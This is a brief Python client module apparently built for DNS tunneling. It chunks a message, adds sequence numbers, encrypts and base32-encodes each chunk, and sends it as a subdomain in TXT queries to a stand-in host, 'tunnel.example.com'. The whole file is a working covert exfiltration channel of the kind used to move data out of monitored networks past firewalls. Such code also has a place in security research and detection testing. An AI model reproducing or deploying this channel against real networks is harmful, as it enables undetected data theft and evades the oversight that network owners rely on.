from crypto_utils.crypto_module import encrypt_chunk
from client.base32_utils import encode_base32
import dns.resolver

def chunk_message(message: bytes, chunk_size=30):
    chunks = []
    i = 0
    while i < len(message):
        chunks.append(message[i:i + chunk_size])
        i += chunk_size
    return chunks

def send_chunked_message(message: bytes, key: bytes, base_domain="tunnel.example.com"):
    chunks = chunk_message(message)
    for seq, chunk in enumerate(chunks):
        if seq == len(chunks) - 1:
            end_marker = b"<END>"
        else:
            end_marker = b""

        seq_prefix = f"{seq:03d}|".encode()
        chunk_with_seq = seq_prefix + chunk + end_marker

        encrypted = encrypt_chunk(chunk_with_seq, key)
        encoded = encode_base32(encrypted)
        domain = f"{encoded}.{base_domain}"
        try:
            dns.resolver.resolve(domain, 'TXT')
            print(f"[✓] Sent DNS query: {domain}")
        except Exception as e:
            print(f"[!] Failed to send: {domain} → {e}")


